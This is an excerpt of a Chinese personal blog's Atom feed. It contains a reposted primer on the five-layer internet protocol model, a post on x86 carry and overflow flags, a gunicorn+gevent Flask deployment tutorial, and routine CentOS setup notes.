        <updated>2020-11-24T11:32:10.000Z</updated>
        <content type="html"><![CDATA[<h1 id="转载互联网协议入门一">（转载）互联网协议入门（一）</h1>
<p>作者： <a href="http://www.ruanyifeng.com/">阮一峰</a></p>
<p>日期： <a href="http://www.ruanyifeng.com/blog/2012/05/">2012年5月31日</a></p>
<p>我们每天使用互联网，你是否想过，它是如何实现的？</p>
<p>全世界几十亿台电脑，连接在一起，两两通信。上海的某一块网卡送出信号，洛杉矶的另一块网卡居然就收到了，两者实际上根本不知道对方的物理位置，你不觉得这是很神奇的事情吗？</p>
<p>互联网的核心是一系列协议，总称为&quot;互联网协议&quot;（Internet Protocol Suite）。它们对电脑如何连接和组网，做出了详尽的规定。理解了这些协议，就理解了互联网的原理。</p>
<p>下面就是我的学习笔记。因为这些协议实在太复杂、太庞大，我想整理一个简洁的框架，帮助自己从总体上把握它们。为了保证简单易懂，我做了大量的简化，有些地方并不全面和精确，但是应该能够说清楚互联网的原理。</p>
<p>=================================================</p>
<p><strong>互联网协议入门</strong></p>
<p>作者：阮一峰</p>
<figure data-type="image" tabindex="1"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052901.jpg" alt="img" loading="lazy"></figure>
<p><strong>一、概述</strong></p>
<p><strong>1.1 五层模型</strong></p>
<p>互联网的实现，分成好几层。每一层都有自己的功能，就像建筑物一样，每一层都靠下一层支持。</p>
<p>用户接触到的，只是最上面的一层，根本没有感觉到下面的层。要理解互联网，必须从最下层开始，自下而上理解每一层的功能。</p>
<p>如何分层有不同的模型，有的模型分七层，有的分四层。我觉得，把互联网分成五层，比较容易解释。</p>
<figure data-type="image" tabindex="2"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052902.png" alt="img" loading="lazy"></figure>
<p>如上图所示，最底下的一层叫做&quot;实体层&quot;（Physical Layer），最上面的一层叫做&quot;应用层&quot;（Application Layer），中间的三层（自下而上）分别是&quot;链接层&quot;（Link Layer）、&quot;网络层&quot;（Network Layer）和&quot;传输层&quot;（Transport Layer）。越下面的层，越靠近硬件；越上面的层，越靠近用户。</p>
<p>它们叫什么名字，其实并不重要。只需要知道，互联网分成若干层就可以了。</p>
<p><strong>1.2 层与协议</strong></p>
<p>每一层都是为了完成一种功能。为了实现这些功能，就需要大家都遵守共同的规则。</p>
<p>大家都遵守的规则，就叫做&quot;协议&quot;（protocol）。</p>
<p>互联网的每一层，都定义了很多协议。这些协议的总称，就叫做&quot;互联网协议&quot;（Internet Protocol Suite）。它们是互联网的核心，下面介绍每一层的功能，主要就是介绍每一层的主要协议。</p>
<p><strong>二、实体层</strong></p>
<p>我们从最底下的一层开始。</p>
<p>电脑要组网，第一件事要干什么？当然是先把电脑连起来，可以用光缆、电缆、双绞线、无线电波等方式。</p>
<figure data-type="image" tabindex="3"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052903.png" alt="img" loading="lazy"></figure>
<p><strong>这就叫做&quot;实体层&quot;，它就是把电脑连接起来的物理手段。它主要规定了网络的一些电气特性，作用是负责传送0和1的电信号。</strong></p>
<p><strong>三、链接层</strong></p>
<p><strong>3.1 定义</strong></p>
<p>单纯的0和1没有任何意义，必须规定解读方式：多少个电信号算一组？每个信号位有何意义？</p>
<p><strong>这就是&quot;链接层&quot;的功能，它在&quot;实体层&quot;的上方，确定了0和1的分组方式。</strong></p>
<p><strong>3.2 以太网协议</strong></p>
<p>早期的时候，每家公司都有自己的电信号分组方式。逐渐地，一种叫做<a href="http://zh.wikipedia.org/wiki/%E4%BB%A5%E5%A4%AA%E7%BD%91">&quot;以太网&quot;</a>（Ethernet）的协议，占据了主导地位。</p>
<p>以太网规定，一组电信号构成一个数据包，叫做&quot;帧&quot;（Frame）。每一帧分成两个部分：标头（Head）和数据（Data）。</p>
<figure data-type="image" tabindex="4"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052904.png" alt="img" loading="lazy"></figure>
<p>&quot;标头&quot;包含数据包的一些说明项，比如发送者、接受者、数据类型等等；&quot;数据&quot;则是数据包的具体内容。</p>
<p>&quot;标头&quot;的长度，固定为18字节。&quot;数据&quot;的长度，最短为46字节，最长为1500字节。因此，整个&quot;帧&quot;最短为64字节，最长为1518字节。如果数据很长，就必须分割成多个帧进行发送。</p>
<p><strong>3.3 MAC地址</strong></p>
<p>上面提到，以太网数据包的&quot;标头&quot;，包含了发送者和接受者的信息。那么，发送者和接受者是如何标识呢？</p>
<p>以太网规定，连入网络的所有设备，都必须具有&quot;网卡&quot;接口。数据包必须是从一块网卡，传送到另一块网卡。网卡的地址，就是数据包的发送地址和接收地址，这叫做MAC地址。</p>
<figure data-type="image" tabindex="5"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052905.jpg" alt="img" loading="lazy"></figure>
<p>每块网卡出厂的时候，都有一个全世界独一无二的MAC地址，长度是48个二进制位，通常用12个十六进制数表示。</p>
<figure data-type="image" tabindex="6"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052906.png" alt="img" loading="lazy"></figure>
<p>前6个十六进制数是厂商编号，后6个是该厂商的网卡流水号。有了MAC地址，就可以定位网卡和数据包的路径了。</p>
<p><strong>3.4 广播</strong></p>
<p>定义地址只是第一步，后面还有更多的步骤。</p>
<p>首先，一块网卡怎么会知道另一块网卡的MAC地址？</p>
<p>回答是有一种ARP协议，可以解决这个问题。这个留到后面介绍，这里只需要知道，以太网数据包必须知道接收方的MAC地址，然后才能发送。</p>
<p>其次，就算有了MAC地址，系统怎样才能把数据包准确送到接收方？</p>
<p>回答是以太网采用了一种很&quot;原始&quot;的方式，它不是把数据包准确送到接收方，而是向本网络内所有计算机发送，让每台计算机自己判断，是否为接收方。</p>
<figure data-type="image" tabindex="7"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052907.png" alt="img" loading="lazy"></figure>
<p>上图中，1号计算机向2号计算机发送一个数据包，同一个子网络的3号、4号、5号计算机都会收到这个包。它们读取这个包的&quot;标头&quot;，找到接收方的MAC地址，然后与自身的MAC地址相比较，如果两者相同，就接受这个包，做进一步处理，否则就丢弃这个包。这种发送方式就叫做&quot;广播&quot;（broadcasting）。</p>
<p>有了数据包的定义、网卡的MAC地址、广播的发送方式，&quot;链接层&quot;就可以在多台计算机之间传送数据了。</p>
<p><strong>四、网络层</strong></p>
<p><strong>4.1 网络层的由来</strong></p>
<p>以太网协议，依靠MAC地址发送数据。理论上，单单依靠MAC地址，上海的网卡就可以找到洛杉矶的网卡了，技术上是可以实现的。</p>
<p>但是，这样做有一个重大的缺点。以太网采用广播方式发送数据包，所有成员人手一&quot;包&quot;，不仅效率低，而且局限在发送者所在的子网络。也就是说，如果两台计算机不在同一个子网络，广播是传不过去的。这种设计是合理的，否则互联网上每一台计算机都会收到所有包，那会引起灾难。</p>
<p>互联网是无数子网络共同组成的一个巨型网络，很像想象上海和洛杉矶的电脑会在同一个子网络，这几乎是不可能的。</p>
<figure data-type="image" tabindex="8"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052914.png" alt="img" loading="lazy"></figure>
<p>因此，必须找到一种方法，能够区分哪些MAC地址属于同一个子网络，哪些不是。如果是同一个子网络，就采用广播方式发送，否则就采用&quot;路由&quot;方式发送。（&quot;路由&quot;的意思，就是指如何向不同的子网络分发数据包，这是一个很大的主题，本文不涉及。）遗憾的是，MAC地址本身无法做到这一点。它只与厂商有关，与所处网络无关。</p>
<p><strong>这就导致了&quot;网络层&quot;的诞生。它的作用是引进一套新的地址，使得我们能够区分不同的计算机是否属于同一个子网络。这套地址就叫做&quot;网络地址&quot;，简称&quot;网址&quot;。</strong></p>
<p>于是，&quot;网络层&quot;出现以后，每台计算机有了两种地址，一种是MAC地址，另一种是网络地址。两种地址之间没有任何联系，MAC地址是绑定在网卡上的，网络地址则是管理员分配的，它们只是随机组合在一起。</p>
<p>网络地址帮助我们确定计算机所在的子网络，MAC地址则将数据包送到该子网络中的目标网卡。因此，从逻辑上可以推断，必定是先处理网络地址，然后再处理MAC地址。</p>
<p><strong>4.2 IP协议</strong></p>
<p>规定网络地址的协议，叫做IP协议。它所定义的地址，就被称为IP地址。</p>
<p>目前，广泛采用的是IP协议第四版，简称IPv4。这个版本规定，网络地址由32个二进制位组成。</p>
<figure data-type="image" tabindex="9"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052908.png" alt="img" loading="lazy"></figure>
<p>习惯上，我们用分成四段的十进制数表示IP地址，从0.0.0.0一直到255.255.255.255。</p>
<p>互联网上的每一台计算机，都会分配到一个IP地址。这个地址分成两个部分，前一部分代表网络，后一部分代表主机。比如，IP地址172.16.254.1，这是一个32位的地址，假定它的网络部分是前24位（172.16.254），那么主机部分就是后8位（最后的那个1）。处于同一个子网络的电脑，它们IP地址的网络部分必定是相同的，也就是说172.16.254.2应该与172.16.254.1处在同一个子网络。</p>
<p>但是，问题在于单单从IP地址，我们无法判断网络部分。还是以172.16.254.1为例，它的网络部分，到底是前24位，还是前16位，甚至前28位，从IP地址上是看不出来的。</p>
<p>那么，怎样才能从IP地址，判断两台计算机是否属于同一个子网络呢？这就要用到另一个参数&quot;子网掩码&quot;（subnet mask）。</p>
<p>所谓&quot;子网掩码&quot;，就是表示子网络特征的一个参数。它在形式上等同于IP地址，也是一个32位二进制数字，它的网络部分全部为1，主机部分全部为0。比如，IP地址172.16.254.1，如果已知网络部分是前24位，主机部分是后8位，那么子网络掩码就是11111111.11111111.11111111.00000000，写成十进制就是255.255.255.0。</p>
<p>知道&quot;子网掩码&quot;，我们就能判断，任意两个IP地址是否处在同一个子网络。方法是将两个IP地址与子网掩码分别进行AND运算（两个数位都为1，运算结果为1，否则为0），然后比较结果是否相同，如果是的话，就表明它们在同一个子网络中，否则就不是。</p>
<p>比如，已知IP地址172.16.254.1和172.16.254.233的子网掩码都是255.255.255.0，请问它们是否在同一个子网络？两者与子网掩码分别进行AND运算，结果都是172.16.254.0，因此它们在同一个子网络。</p>
<p>总结一下，IP协议的作用主要有两个，一个是为每一台计算机分配IP地址，另一个是确定哪些地址在同一个子网络。</p>
<p><strong>4.3 IP数据包</strong></p>
<p>根据IP协议发送的数据，就叫做IP数据包。不难想象，其中必定包括IP地址信息。</p>
<p>但是前面说过，以太网数据包只包含MAC地址，并没有IP地址的栏位。那么是否需要修改数据定义，再添加一个栏位呢？</p>
<p>回答是不需要，我们可以把IP数据包直接放进以太网数据包的&quot;数据&quot;部分，因此完全不用修改以太网的规格。这就是互联网分层结构的好处：上层的变动完全不涉及下层的结构。</p>
<p>具体来说，IP数据包也分为&quot;标头&quot;和&quot;数据&quot;两个部分。</p>
<figure data-type="image" tabindex="10"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052909.png" alt="img" loading="lazy"></figure>
<p>&quot;标头&quot;部分主要包括版本、长度、IP地址等信息，&quot;数据&quot;部分则是IP数据包的具体内容。它放进以太网数据包后，以太网数据包就变成了下面这样。</p>
<figure data-type="image" tabindex="11"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052910.png" alt="img" loading="lazy"></figure>
<p>IP数据包的&quot;标头&quot;部分的长度为20到60字节，整个数据包的总长度最大为65,535字节。因此，理论上，一个IP数据包的&quot;数据&quot;部分，最长为65,515字节。前面说过，以太网数据包的&quot;数据&quot;部分，最长只有1500字节。因此，如果IP数据包超过了1500字节，它就需要分割成几个以太网数据包，分开发送了。</p>
<p><strong>4.4 ARP协议</strong></p>
<p>关于&quot;网络层&quot;，还有最后一点需要说明。</p>
<p>因为IP数据包是放在以太网数据包里发送的，所以我们必须同时知道两个地址，一个是对方的MAC地址，另一个是对方的IP地址。通常情况下，对方的IP地址是已知的（后文会解释），但是我们不知道它的MAC地址。</p>
<p>所以，我们需要一种机制，能够从IP地址得到MAC地址。</p>
<p>这里又可以分成两种情况。第一种情况，如果两台主机不在同一个子网络，那么事实上没有办法得到对方的MAC地址，只能把数据包传送到两个子网络连接处的&quot;网关&quot;（gateway），让网关去处理。</p>
<p>第二种情况，如果两台主机在同一个子网络，那么我们可以用ARP协议，得到对方的MAC地址。ARP协议也是发出一个数据包（包含在以太网数据包中），其中包含它所要查询主机的IP地址，在对方的MAC地址这一栏，填的是FF:FF:FF:FF:FF:FF，表示这是一个&quot;广播&quot;地址。它所在子网络的每一台主机，都会收到这个数据包，从中取出IP地址，与自身的IP地址进行比较。如果两者相同，都做出回复，向对方报告自己的MAC地址，否则就丢弃这个包。</p>
<p>总之，有了ARP协议之后，我们就可以得到同一个子网络内的主机MAC地址，可以把数据包发送到任意一台主机之上了。</p>
<p><strong>五、传输层</strong></p>
<p><strong>5.1 传输层的由来</strong></p>
<p>有了MAC地址和IP地址，我们已经可以在互联网上任意两台主机上建立通信。</p>
<p>接下来的问题是，同一台主机上有许多程序都需要用到网络，比如，你一边浏览网页，一边与朋友在线聊天。当一个数据包从互联网上发来的时候，你怎么知道，它是表示网页的内容，还是表示在线聊天的内容？</p>
<p>也就是说，我们还需要一个参数，表示这个数据包到底供哪个程序（进程）使用。这个参数就叫做&quot;端口&quot;（port），它其实是每一个使用网卡的程序的编号。每个数据包都发到主机的特定端口，所以不同的程序就能取到自己所需要的数据。</p>
<p>&quot;端口&quot;是0到65535之间的一个整数，正好16个二进制位。0到1023的端口被系统占用，用户只能选用大于1023的端口。不管是浏览网页还是在线聊天，应用程序会随机选用一个端口，然后与服务器的相应端口联系。</p>
<p>**&quot;传输层&quot;的功能，就是建立&quot;端口到端口&quot;的通信。相比之下，&quot;网络层&quot;的功能是建立&quot;主机到主机&quot;的通信。只要确定主机和端口，我们就能实现程序之间的交流。**因此，Unix系统就把主机+端口，叫做&quot;套接字&quot;（socket）。有了它，就可以进行网络应用程序开发了。</p>
<p><strong>5.2 UDP协议</strong></p>
<p>现在，我们必须在数据包中加入端口信息，这就需要新的协议。最简单的实现叫做UDP协议，它的格式几乎就是在数据前面，加上端口号。</p>
<p>UDP数据包，也是由&quot;标头&quot;和&quot;数据&quot;两部分组成。</p>
<figure data-type="image" tabindex="12"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052911.png" alt="img" loading="lazy"></figure>
<p>&quot;标头&quot;部分主要定义了发出端口和接收端口，&quot;数据&quot;部分就是具体的内容。然后，把整个UDP数据包放入IP数据包的&quot;数据&quot;部分，而前面说过，IP数据包又是放在以太网数据包之中的，所以整个以太网数据包现在变成了下面这样：</p>
<figure data-type="image" tabindex="13"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052912.png" alt="img" loading="lazy"></figure>
<p>UDP数据包非常简单，&quot;标头&quot;部分一共只有8个字节，总长度不超过65,535字节，正好放进一个IP数据包。</p>
<p><strong>5.3 TCP协议</strong></p>
<p>UDP协议的优点是比较简单，容易实现，但是缺点是可靠性较差，一旦数据包发出，无法知道对方是否收到。</p>
<p>为了解决这个问题，提高网络可靠性，TCP协议就诞生了。这个协议非常复杂，但可以近似认为，它就是有确认机制的UDP协议，每发出一个数据包都要求确认。如果有一个数据包遗失，就收不到确认，发出方就知道有必要重发这个数据包了。</p>
<p>因此，TCP协议能够确保数据不会遗失。它的缺点是过程复杂、实现困难、消耗较多的资源。</p>
<p>TCP数据包和UDP数据包一样，都是内嵌在IP数据包的&quot;数据&quot;部分。TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。</p>
<p><strong>六、应用层</strong></p>
<p>应用程序收到&quot;传输层&quot;的数据，接下来就要进行解读。由于互联网是开放架构，数据来源五花八门，必须事先规定好格式，否则根本无法解读。</p>
<p><strong>&quot;应用层&quot;的作用，就是规定应用程序的数据格式。</strong></p>
<p>举例来说，TCP协议可以为各种各样的程序传递数据，比如Email、WWW、FTP等等。那么，必须有不同协议规定电子邮件、网页、FTP数据的格式，这些应用程序协议就构成了&quot;应用层&quot;。</p>
<p>这是最高的一层，直接面对用户。它的数据就放在TCP数据包的&quot;数据&quot;部分。因此，现在的以太网的数据包就变成下面这样。</p>
<figure data-type="image" tabindex="14"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052913.png" alt="img" loading="lazy"></figure>
<p>至此，整个互联网的五层结构，自下而上全部讲完了。这是从系统的角度，解释互联网是如何构成的。下一篇，我反过来，从用户的角度，自上而下看看这个结构是如何发挥作用，完成一次网络数据交换的。</p>
<p>（完）</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CF OF 进位 溢出]]></title>
        <id>https://Morn-zh.github.io/post/cf-of-jin-wei-yi-chu/</id>
        <link href="https://Morn-zh.github.io/post/cf-of-jin-wei-yi-chu/">
        </link>
        <updated>2020-10-30T11:12:32.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-我的问题">0x01 我的问题</h1>
<ul>
<li>Q：CF表示进位，OF表示溢出，那么进位是否表示溢出，又或者溢出是否就一定会有进位？</li>
</ul>
<p>想要直接看答案，直接跳转<strong>0x04 回到问题</strong>，想要理解过程可以接着往下看</p>
<h1 id="0x02-相关的知识">0x02 相关的知识</h1>
<p>解答疑问之前，先明确下，溢出是<strong>所要表示的数值</strong>超出了<strong>本身能够表示的范围</strong></p>
<p>以8位寄存器为例，来看看在将<strong>操作数</strong>视为<strong>无符号数</strong>和<strong>有符号数</strong>时能够表示的范围</p>
<p>操作数 xxxx xxxx</p>
<p>无符号数 xxxx xxxx</p>
<p>有符号数 符号位+xxx xxxx</p>
<table>
<thead>
<tr>
<th></th>
<th>范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>无符号数</td>
<td>0~2<sup>8</sup>-1</td>
</tr>
<tr>
<td>有符号数</td>
<td>-2<sup>7</sup>~2<sup>7</sup>-1</td>
</tr>
</tbody>
</table>
<p><strong>标志位CF/OF为1时，表示的含义</strong></p>
<table>
<thead>
<tr>
<th>标志位</th>
<th>含义</th>
<th>表示结果是否正确（将进位值作为权值考虑在内）</th>
</tr>
</thead>
<tbody>
<tr>
<td>CF=1</td>
<td><strong>无符号数</strong>运算超出范围</td>
<td><strong>依旧正确</strong></td>
</tr>
<tr>
<td>OF=1</td>
<td><strong>有符号数</strong>运算超出范围</td>
<td>错误</td>
</tr>
</tbody>
</table>
<p>例1：操作数看做无符号数，关注CF<br>
<img src="https://Morn-zh.github.io/post-images/1604056428774.png" alt="" loading="lazy"></p>
<p>例2：操作数看做无符号数，关注CF</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/1604056465337.png" alt="" loading="lazy"></figure>
<p>将例1看做有符号数，关注OF</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/1604056485295.png" alt="" loading="lazy"></figure>
<p>将例2看做有符号数，关注OF</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/1604056493045.png" alt="" loading="lazy"></figure>
<h1 id="0x03-怎么理解呢">0x03 怎么理解呢？</h1>
<p>处理器会<strong>同时</strong>按照<strong>无符号</strong>和<strong>有符号</strong>运算法则进行运算，并且设置CF和OF两个标志位</p>
<p>==&gt;也就是说操作数进入运算器后，运算器会进行两次运算，分别设置CF和OF标志位</p>
<p><strong>至于如何利用这两个设置好的标志位，这将取决于程序员</strong></p>
<ul>
<li>如果程序员想要进行<strong>有符号数运算</strong>，那么将关注<strong>OF</strong>的情况，通过OF标志位判断计算结果是否溢出</li>
<li>如果程序员想要进行<strong>无符号数运算</strong>，那么将关注<strong>CF</strong>的情况，通过CF标志位判断是否需要进位</li>
</ul>
<p>另外，还可以这样说</p>
<ul>
<li>对于<strong>无符号数</strong>来说，只有是否<strong>进位</strong>，不存在溢出</li>
<li>对于<strong>有符号数</strong>来说，只有是否<strong>溢出</strong>，不存在进位</li>
</ul>
<p>存在这样的关系</p>
<p>无符号数 &lt;------&gt; 进位 &lt;------&gt; CF</p>
<p>有符号数 &lt;------&gt; 溢出 &lt;------&gt; OF</p>
<h1 id="0x04-回到问题">0x04 回到问题</h1>
<p>Q：CF表示进位，OF表示溢出，那么进位是否表示溢出，又或者溢出是否就一定会有进位？</p>
<p>A：进位不一定溢出，溢出也不一定进位，因为这两个概念对应两个不同的标志位CF、OF，而这两个标志位又是相对有符号数和无符号数来说的。</p>
<ul>
<li>
<p>如果我们将操作数看做无符号数，此时只需要考虑是否进位，与是否溢出的无关</p>
</li>
<li>
<p>如果将操作数看做有符号数，此时我们应该关心运算结果是否溢出，与是否进位无关</p>
</li>
</ul>
<p>如果看不懂，可以回看理解的过程</p>
<p>如果理解或者解答有误，请及时联系，我将第一时间进行更正，万分谢谢！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[gunicorn+gevent部署flask]]></title>
        <id>https://Morn-zh.github.io/post/gunicorngevent-bu-shu-flask/</id>
        <link href="https://Morn-zh.github.io/post/gunicorngevent-bu-shu-flask/">
        </link>
        <updated>2020-09-15T13:22:02.000Z</updated>
        <content type="html"><![CDATA[<p>之前试过用<strong>uwsgi+nginx+supervisor</strong>部署flask项目，最近因为舍友需要，帮着搭建一个flask的api，同样是需要部署上线的，趁此机会尝试另外一种部署方式<strong>gunicorn+gevent</strong></p>
<p>提前说结论，<strong>gunicorn+gevent</strong>部署更加简单</p>
<h1 id="ox00-环境以及文件结构">ox00 环境以及文件结构</h1>
<h2 id="当前环境">当前环境</h2>
<ul>
<li>centos 7.3</li>
<li>python3.8.1</li>
</ul>
<h2 id="文件结构">文件结构</h2>
<p>最终的的文件结构是这样的，其中<strong>myproject</strong>是我们的项目文件，里面包含了虚拟环境的文件夹<strong>venv</strong>，flask的主体文件<strong>main.py</strong>，以及gunicorn的配置文件<strong>gunicorn.conf.py</strong>，具体内容会在后面一一展示</p>
<pre><code>.
└── myproject
    ├── gunicorn.conf.py
    ├── main.py
    └── venv
        ├── bin
        ├── lib
        └── pyvenv.cfg

4 directories, 3 files
</code></pre>
<p>先进入我们的项目文件夹内，假设项目文件位于/home/myproject，进入项目文件并进行后续操作</p>
<pre><code>cd /home/myproject
</code></pre>
<h1 id="ox01-创建虚拟环境">ox01 创建虚拟环境</h1>
<p>为了不污染当前的环境，安装并创建虚拟环境</p>
<h2 id="安装virtualenv">安装virtualenv</h2>
<pre><code>pip install virtualenv
</code></pre>
<p>测试安装是否成功，输入后如果显示所有命令，则成功</p>
<pre><code>virtualenv --version
</code></pre>
<p>如果显示没有找到该命令，可能需要去配置下环境变量，步骤如下</p>
<pre><code>vim /etc/profile
# 将下面内容添加到文件的最下面,添加内容为python3的安装目录，根据实际情况进行更改
PATH=$PATH:/usr/local/python3/bin

# 更新配置
source /etc/profile
</code></pre>
<h2 id="创建虚拟环境">创建虚拟环境</h2>
<pre><code>virtualenv --python=python3  venv
</code></pre>
<p>其中venv是自定义的，运行后会出现venv的文件夹，之后需要的包都会被安装在里面</p>
<h2 id="激活虚拟环境">激活虚拟环境</h2>
<pre><code>source venv/bin/activate
</code></pre>
<p>激活成功能看到命令行前面出现我们命名的虚拟环境的名字<strong>venv</strong>，此时已经处于虚拟环境中，后续操作<strong>将在虚拟环境中进行</strong></p>
<p>ps：退出虚拟环境的命令</p>
<pre><code>deactivate
</code></pre>
<h1 id="ox02-安装gunicorngevent">ox02 安装gunicorn+gevent</h1>
<p><strong>在虚拟环境中</strong>安装下flask程序中需要用到的库</p>
<p>你说你不知道需要哪些？直接运行下flask不就知道了，依次安装下需要用到的库</p>
<pre><code># main.py 为flask的主体文件，后面会展示
python main.py
</code></pre>
<p>安装今天的主角gunicorn+gevent</p>
<pre><code class="language-bash">pip install gunicorn gevent
</code></pre>
<p>展示下main.py吧，就是最简单的那种falsk程序</p>
<pre><code># main.py
# 文件名main，后面启动时会用到
from flask import Flask

# 变量名app，后面启动时会用到
app = Flask(__name__)


@app.route('/')
def index():
    return 'here is index'

if __name__ == '__main__':
	# 运行在0.0.0.0，端口为9000,端口号会在后面验证是否部署成功时用到
    app.run(debug=True,host = '0.0.0.0',port=9000)
</code></pre>
<h1 id="ox03-配置gunicorn">ox03 配置gunicorn</h1>
<h2 id="创建配置文件">创建配置文件</h2>
<p>创建<strong>gunicorn.conf.py</strong>文件，并且将以下内容<strong>直接复制</strong>进去</p>
<pre><code>vim gunicorn.conf.py
</code></pre>
<pre><code>import multiprocessing
import gevent.monkey
gevent.monkey.patch_all()

workers = multiprocessing.cpu_count()*2    # 定义同时开启的处理请求的进程数量，根据网站流量适当调整
worker_class = &quot;gevent&quot;   # 采用gevent库，支持异步处理请求，提高吞吐量
bind = &quot;0.0.0.0:9000&quot;
daemon = True
# daemon为true意味着开启后台运行，默认为False

# 以下为日志配置，可选内容，选取的话需要在项目文件内载创建个log文件夹，mkdir log
# loglevel = 'debug'
# pidfile = &quot;log/gunicorn.pid&quot;
# accesslog = &quot;log/access.log&quot;
# errorlog = &quot;log/debug.log&quot;

</code></pre>
<h2 id="运行gunicorn">运行gunicorn</h2>
<pre><code>gunicorn main:app -c gunicorn.conf.py
</code></pre>
<h2 id="解释说明">解释说明</h2>
<p>main为flask主体文件名，app为创建flask对象时使用的变量名，gunicorn.conf.py为gunicorn的配置文件</p>
<p>至此，部署完毕，可以试着访问下你的外网ip地址加端口，例:47.100.91.124:9000</p>
<h1 id="ox04-后续">ox04 后续</h1>
<p>因为gunicorn只有启动的选项，需要关闭的话，你可能会用到如下指令</p>
<pre><code>kill $(lsof -i:9000|awk '{if(NR==2)print $2}')
</code></pre>
<p>原理是筛选端口，关闭对应的服务，其中9000就是之前设置的端口号</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[折腾Centos随记]]></title>
        <id>https://Morn-zh.github.io/post/zhe-teng-centos-sui-ji/</id>
        <link href="https://Morn-zh.github.io/post/zhe-teng-centos-sui-ji/">
        </link>
        <updated>2020-09-14T09:22:11.000Z</updated>
        <content type="html"><![CDATA[<p>pkill -f uWSGI -9 杀掉所有进程<br>
cd /etc/yum.repos.d/</p>
<p>生成requirements.txt（虚拟环境下操作）<br>
pip freeze &gt;requirements.txt<br>
pip install -r requirements.txt</p>
<p>docker安装<br>
yum update<br>
yum install -y yum-utils device-mapper-persistent-data lvm2<br>
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</p>
<h1 id="gunicorn启动指令">gunicorn启动指令</h1>
<p>gunicorn start:app -c gunicorn.conf.py</p>
<p>kill $(lsof -i:9000|awk '{if(NR==2)print $2}')</p>
<h1 id="创建纯净的虚拟环境">创建纯净的虚拟环境</h1>
<pre><code>vim /etc/profile
# 将下面内容添加到文件的最下面
PATH=$PATH:/usr/local/python3/bin

#是添加的进行生效命令
source /etc/profile
</code></pre>
<p>virtualenv --python=python3  venv</p>
<h1 id="centos换源">centos换源</h1>
<p>mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</p>
<p>wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</p>
<p>yum clean all</p>
<p>yum makecache</p>
<p>yum update</p>
<h1 id="centos7安装python381">centos7安装python3.8.1</h1>
<p>https://blog.csdn.net/wohiusdashi/article/details/89358071</p>
<h1 id="centos7安装mysql">centos7安装mysql</h1>
<p>https://blog.csdn.net/weixin_43616817/article/details/106378512</p>
]]></content>
    </entry>
</feed>